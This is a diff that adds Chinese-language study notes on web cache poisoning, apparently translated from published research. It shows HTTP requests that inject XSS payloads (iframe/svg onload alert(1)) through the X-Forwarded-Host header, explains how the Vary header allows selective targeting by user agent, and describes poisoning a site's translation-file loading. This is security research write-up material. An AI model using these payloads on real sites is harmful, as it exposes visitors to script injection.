@@ -112,9 +112,70 @@ Cache-Control: public, max-age=1800
 ```
 
 
+#### Selective Poisoning
+“Vary” ：赋予的值代表缓存键.
+```code
+GET / HTTP/1.1  
+Host: redacted.com  
+User-Agent: Mozilla/5.0 … Firefox/60.0  
+X-Forwarded-Host: a"><iframe onload=alert(1)>  
+  
+HTTP/1.1 200 OK  
+X-Served-By: cache-lhr6335-LHR  
+Vary: User-Agent, Accept-Encoding  
+…  
+<link rel="canonical" href="https://a">a<iframe onload=alert(1)>  
+</iframe>
+```
+Vary头告诉我们，我们的User-Agent可能是该高速缓存键的一部分，手动测试证实了这一点。这意味着，由于我们声称使用Firefox 60，我们的漏洞将只提供给其他Firefox 60用户。~~我们可以使用流行的用户代理列表来确保大多数访问者收到我们的漏洞，但这种行为给了我们更多选择性攻击的选择。如果你知道他们的用户代理，你就有可能针对特定的人进行攻击，甚至可以隐藏自己的网站监控团队。~~
+
 #### DOM Poisoning
+利用未加密的输入并不总是像写入XSS Payload一样容易。如以下请求：
 
+```
+GET /dataset HTTP/1.1
+Host: catalog.data.gov
+X-Forwarded-Host: canary
 
+HTTP/1.1 200 OK
+Age: 32707
+X-Cache: Hit from cloudfront 
+…
+<body data-site-root="https://canary/">
+```
+
+我们已经控制了'data-site-root'属性，但我们不能突破以使用XSS，并且不清楚这个属性甚至用于什么。为了找到答案，我在Burp中创建了一个匹配并替换的规则，为所有请求添加了“X-Forwarded-Host：id.burpcollaborator.net”协议头，然后浏览了该站点。当加载某些页面时，Firefox会将JavaScript生成的请求发送到我的服务器：
+
+```
+GET /api/i18n/en HTTP/1.1
+Host: id.burpcollaborator.net
+```
+
+该路径表明，在网站的某个地方，有一些JavaScript代码使用data-site-root属性来决定从哪里加载一些国际数据。我试图通过获取[https://catalog.data.gov/api/i18n/en](https://catalog.data.gov/api/i18n/en) 来找出这些数据应该是什么样的，但只是收到了一个空的JSON响应。幸运的是，将'en'改为'es'拿到了一个线索：
+
+```
+GET /api/i18n/es HTTP/1.1
+Host: catalog.data.gov
+
+HTTP/1.1 200 OK
+…
+{"Show more":"Mostrar más"}
+```
+
+该文件包含用于将短语翻译为用户所选语言的地图。通过创建我们自己的翻译文件并使缓存投毒，我们可以将短语翻译变成漏洞：
+
+```
+GET  /api/i18n/en HTTP/1.1
+Host: portswigger-labs.net
+
+HTTP/1.1 200 OK
+...
+{"Show more":"<svg onload=alert(1)>"}
+```
+
+最终的结果，任何查看包含“显示更多”文字的网页的人都会被利用。
+
+到此为止 ，更多内容请看paper
 
 ## Tools
 [Param Miner](https://github.com/PortSwigger/param-miner)
